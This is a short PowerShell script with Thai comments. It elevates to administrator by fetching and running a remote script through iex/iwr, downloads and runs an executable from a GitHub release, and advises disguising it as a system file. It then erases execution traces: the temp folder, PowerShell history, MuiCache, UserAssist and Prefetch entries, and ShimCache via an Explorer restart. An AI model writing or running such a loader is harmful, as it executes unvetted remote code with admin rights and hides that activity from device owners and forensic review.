# 1. ขอสิทธิ์ Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/GetX/main/run.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่า (แนะนำให้เปลี่ยนชื่อไฟล์ .exe เป็นชื่อที่ดูเหมือนไฟล์ระบบ เช่น TaskHost.exe จะเนียนขึ้น)
$url = "https://github.com/getx796-Harem/GetX/releases/download/v1.0/reset.inputlag.exe"
$fileName = "reset.inputlag.exe"
$workDir = "$env:LOCALAPPDATA\Temp\SystemData"
$exePath = Join-Path $workDir $fileName

# 3. เตรียมที่เก็บ
if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }

# 4. ดาวน์โหลดและรัน
Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath -WorkingDirectory $workDir -Wait
}

# 5. --- เริ่มกระบวนการลบเฉพาะจุด (Targeted Cleaning) ---
Write-Host "[*] Cleaning specific traces..." -ForegroundColor Yellow

# ลบไฟล์โปรแกรม
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ลบประวัติ PowerShell
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }

# ลบชื่อโปรแกรมจาก MuiCache (จุดหลักที่ LastActivityView ใช้ดึงชื่อโปรแกรม)
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-Item -Path $muiPath | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fileName*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
}

# ลบจาก AppCompatCache (ShimCache) - ต้องใช้ไม้ตายเรียกคำสั่งล้าง Cache ของระบบ
# (ปกติ Windows จะบันทึกไฟล์ที่เคยรันไว้ใน RAM ก่อนเขียนลง Registry การ Restart Explorer ช่วยได้)
Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue

# ลบจาก UserAssist (ประวัติการรันโปรแกรมของ User)
$uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
Get-ChildItem -Path $uaPath | Get-ChildItem | Get-ChildItem | Where-Object { $_.Name -like "*$fileName*" } | Remove-Item -Force -ErrorAction SilentlyContinue

# ลบ Prefetch (เฉพาะไฟล์ที่เกี่ยวกับโปรแกรมนี้)
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*reset.inputlag*" | Remove-Item -Force -ErrorAction SilentlyContinue

# เริ่ม Explorer ใหม่เพื่อให้ระบบ Refresh
Start-Process Explorer

Write-Host "[+] Target traces removed." -ForegroundColor Green
